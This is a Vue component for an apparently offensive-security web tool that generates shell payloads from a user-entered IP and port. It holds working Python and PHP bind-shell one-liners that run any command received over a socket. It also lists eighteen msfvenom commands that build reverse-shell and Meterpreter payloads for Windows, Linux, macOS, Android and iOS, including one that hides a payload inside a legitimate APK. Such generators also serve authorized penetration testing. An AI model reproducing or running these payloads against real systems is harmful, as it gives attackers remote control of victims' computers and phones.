<template>
    <el-card class="box-card">
        <div class="nkmode">
            <h4 style="margin-top: 0;">IP & PORT</h4><el-button type="primary">更新</el-button>
        </div>
        <el-space :size="30">
            <el-input v-model="reverse.ip" style="width: 210px;">
                <template #prepend>IP:</template>
            </el-input>
            <el-input v-model="reverse.port" style="width: 200px;">
                <template #prepend>PORT:</template>
            </el-input>
        </el-space>
    </el-card>
    <el-tabs type="border-card" style="margin-top: 10px;">
        <el-tab-pane label="Reverse">

        </el-tab-pane>
        <el-tab-pane label="Bind">
            <div style="display: flex;">
                <el-table :data="data.bind" border highlight-current-row :show-header="false" @current-change="handleChange"
                    style="width: 30%">
                    <el-table-column prop="label" @current-change="handleChange" />
                </el-table>
                <el-input v-model="reverse.show" type="textarea" rows="20" resize="none"
                    style="width: 80%; margin-left: 10px;"></el-input>
            </div>
        </el-tab-pane>
        <el-tab-pane label="MSFVenom">
            <div style="display: flex;">
                <el-table :data="data.msf" border highlight-current-row :show-header="false" @current-change="handleChange"
                    style="width: 35%; height: 65vh;">
                    <el-table-column prop="label" @current-change="handleChange" />
                </el-table>
                <el-input v-model="reverse.show" type="textarea" rows="20" resize="none"
                    style="width: 80%; margin-left: 10px;"></el-input>
            </div>
        </el-tab-pane>
    </el-tabs>
</template>
  
<script lang="ts" setup>
import { reactive } from 'vue';

const reverse = reactive({
    ip: '10.10.10.1',
    port: '60001',
    show: '',
})

var data = reactive({
    rever: [
        {

        },
    ],
    bind: [
        {
            label: "Python3 Bind",
            value: `python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("${reverse.ip}",${reverse.port}));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
        },
        {
            label: "PHP Bind",
            value: `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"${reverse.ip}",${reverse.port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`
        }
    ],
    msf: [
        {
            label: "Windows Meterpreter Staged Reverse TCP (x64)",
            value: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f exe -o reverse.exe`
        },
        {
            label: "Windows Meterpreter Stageless Reverse TCP (x64)",
            value: `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f exe -o reverse.exe`
        },
        {
            label: "Windows Staged Reverse TCP (x64)",
            value: `msfvenom -p windows/x64/shell/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f exe -o reverse.exe`
        },
        {
            label: "Windows Stageless Reverse TCP (x64)",
            value: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f exe -o reverse.exe`
        },
        {
            label: "Windows Staged JSP Reverse TCP",
            value: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f jsp -o ./rev.jsp`
        },
        {
            label: "PHP Meterpreter Stageless Reverse TCP",
            value: `msfvenom -p php/meterpreter_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f raw -o shell.php`
        },
        {
            label: "PHP Reverse PHP",
            value: `msfvenom -p php/reverse_php LHOST=${reverse.ip} LPORT=${reverse.port} -o shell.php`
        },
        {
            label: "JSP Stageless Reverse TCP",
            value: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f raw -o shell.jsp`
        },
        {
            label: "WAR Stageless Reverse TCP",
            value: `msfvenom -p java/shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f war -o shell.war`
        },
        {
            label: "Python Stageless Reverse TCP",
            value: `msfvenom -p cmd/unix/reverse_python LHOST=${reverse.ip} LPORT=${reverse.port} -f raw`
        },
        {
            label: "Linux Meterpreter Staged Reverse TCP (x64)",
            value: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f elf -o reverse.elf`
        },
        {
            label: "Linux Stageless Reverse TCP (x64)",
            value: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f elf -o reverse.elf`
        },
        {
            label: "macOS Meterpreter Staged Reverse TCP (x64)",
            value: `msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f macho -o shell.macho`
        },
        {
            label: "macOS Meterpreter Stageless Reverse TCP (x64)",
            value: `msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f macho -o shell.macho`
        },
        {
            label: "macOS Stageless Reverse TCP (x64)",
            value: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f macho -o shell.macho`
        },
        {
            label: "Android Meterpreter Reverse TCP",
            value: `msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} R -o malicious.apk`
        },
        {
            label: "Android Meterpreter Embed Reverse TCP",
            value: `msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -o payload.apk`
        },
        {
            label: "Apple iOS Meterpreter Reverse TCP Inline",
            value: `msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f macho -o payload`
        },
    ]
})



function handleChange(row: any) {
    reverse.show = row.value;
}


</script>